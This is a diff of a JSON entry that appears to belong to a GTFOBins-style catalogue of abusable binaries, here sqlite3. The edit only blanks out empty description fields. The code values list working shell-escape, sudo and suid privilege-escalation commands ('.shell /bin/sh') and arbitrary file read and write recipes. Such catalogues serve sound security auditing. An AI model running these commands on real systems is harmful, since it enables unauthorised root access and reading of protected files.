@@ -2,37 +2,37 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ]
